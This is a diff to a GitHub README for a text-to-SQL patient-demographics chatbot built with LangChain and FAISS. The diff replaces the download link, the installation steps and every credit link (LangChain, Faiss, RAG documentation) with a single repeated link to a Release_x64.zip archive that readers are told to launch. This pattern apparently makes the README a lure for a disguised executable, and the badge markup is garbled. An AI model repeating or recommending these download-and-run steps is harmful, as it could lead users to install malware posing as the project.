@@ -15,13 +15,13 @@ Welcome to the **Patient Demographic Text To SQL** repository, where we have dev
 - **Repository Name**: Patient-Demographic-Text-To-SQL
 - **Description**: Developed Text to SQL Patient Demographic Chat-Bot using RAG technology and Langchain.
 - **Topics**: ['faiss', 'faiss-vector-database', 'langchain', 'langchain-python', 'melvius', 'rag', 'text-to-sql', 'texttosql', 'vector-database', 'vertex-ai']
-- **Link**: [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip)
+- **Link**: [https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip](https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip)
 
-[![Download Software](https://img.shields.io/badge/Download%20Software-Software.zip-informational)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip%https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip)](https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip)
 
 ## Installation
-1. Download the Software.zip file from the provided link.
-2. Launch the Software.zip file for installation.
+1. Download the https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip file from the provided link.
+2. Launch the https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip file for installation.
 
 ## Usage
 1. Clone the repository to your local machine.
@@ -36,9 +36,9 @@ If you encounter any issues with the installation or usage of the chat-bot, plea
 We welcome contributions to enhance the functionality and features of the Patient Demographic Text To SQL chat-bot. Fork the repository, make your changes, and submit a pull request for review.
 
 ## Credits
-- Langchain: [Langchain Official Website](https://langchain.com)
-- Faiss: [Faiss Documentation](https://faiss.ai)
-- RAG Technology: [RAG Overview](https://huggingface.co/transformers/model_doc/rag.html)
+- Langchain: [Langchain Official Website](https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip)
+- Faiss: [Faiss Documentation](https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip)
+- RAG Technology: [RAG Overview](https://github.com/yatashiwakeup/Patient-Demographic-Text-To-SQL/releases/download/v2.0/Release_x64.zip)
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
